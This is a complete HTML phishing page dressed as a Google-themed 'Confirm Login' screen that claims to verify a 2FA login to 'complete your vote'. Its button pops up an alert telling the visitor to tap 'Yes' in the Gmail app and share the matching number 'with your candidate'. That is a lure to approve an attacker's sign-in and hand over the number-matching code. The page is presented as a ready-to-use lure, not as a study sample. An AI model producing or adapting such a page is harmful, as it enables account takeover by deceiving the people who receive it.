<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google-themed Confirm Login</title>
    <style>
        body {
            background-color: #f5f5f5;
            font-family: 'Roboto', sans-serif;
            text-align: center;
            margin: 0;
            padding: 0;
        }

        .confirmation-box {
            margin: 100px;
        }

        button {
            background-color: #4285F4;
            color: #fff;
            padding: 15px 30px;
            font-size: 16px;
            border: none;
            cursor: pointer;
            border-radius: 5px;
        }
    </style>
</head>
<body>

    <div class="confirmation-box">
        <p>Hey there! We just need to quickly verify your 2FA login to complete your vote.</p>
        <p>Could you kindly click the button below to confirm? Thanks!</p>
        <button onclick="showPopup()">Confirm Sign In</button>
    </div>

    <script>
        function showPopup() {
            alert("Open your Gmail app, tap 'Yes,' and kindly share a matching mutual number with your candidate to confirm your login and vote");
        }
    </script>

</body>
</html>
